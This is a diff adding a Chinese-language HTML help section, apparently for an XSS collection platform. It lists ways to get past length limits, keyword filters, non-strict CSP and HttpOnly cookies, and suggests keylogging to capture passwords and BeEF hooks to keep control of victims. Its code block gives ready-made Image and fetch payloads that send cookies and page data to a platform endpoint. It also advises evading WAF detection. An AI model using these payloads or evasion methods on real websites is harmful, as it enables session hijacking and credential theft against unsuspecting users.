@@ -1,0 +1,24 @@
+<h4>绕过与进阶技巧</h4>
+<ul>
+<li><b>长度受限</b>：注入点只允许少量字符时，只写外链：<code>&lt;script src="//平台/短链"&gt;&lt;/script&gt;</code>，复杂逻辑全部放在平台托管文件里。</li>
+<li><b>关键字过滤</b>：用 <code>&lt;img src=x onerror=...&gt;</code>、<code>&lt;svg onload=...&gt;</code> 替代 <code>script</code>；属性值用 HTML 实体、JS 十六进制或 <code>String.fromCharCode</code> 规避关键字。</li>
+<li><b>CSP 存在但非严格</b>：寻找白名单域（CDN、旧版本 JS 库）做 JSONP 或脚本托管；若允许 <code>unsafe-inline</code>，仍可直接执行。</li>
+<li><b>HttpOnly 场景</b>：读不到 cookie 时，改为窃取页面内容、表单数据、CSRF Token，或用键盘记录等待用户输入账号密码。</li>
+<li><b>Blind XSS</b>：payload 在后台管理页面才触发，收信地址需要长期有效；用平台记录 UA、来源 URL 判断触发环境。</li>
+<li><b>维持会话</b>：BeEF 的 hook 脚本会定时心跳，受害者不关页面就能持续接收指令。</li>
+</ul>
+
+<h4>外带数据的几种写法</h4>
+<pre>
+# 图片请求（最常用，兼容性好）
+&lt;script&gt;new Image().src='{{BASE}}/modules/xss/platform.php?rx=TOKEN&amp;c='+encodeURIComponent(document.cookie);&lt;/script&gt;
+
+# fetch（可带 POST 体，适合大数据量）
+&lt;script&gt;fetch('{{BASE}}/modules/xss/platform.php?rx=TOKEN',{method:'POST',body:document.cookie});&lt;/script&gt;
+
+# 只外带关键字段，降低被 WAF 命中的概率
+&lt;script&gt;new Image().src='{{BASE}}/modules/xss/platform.php?rx=TOKEN&amp;c='+document.domain;&lt;/script&gt;
+</pre>
+
+<h4>注意事项</h4>
+<p>平台托管脚本通常位于第三方域名，可能被目标站点的 CSP、Referer 校验或出口防火墙拦截；实战中需要先确认目标允许的脚本来源，再决定用短链、HTTPS 还是自建域名。</p>
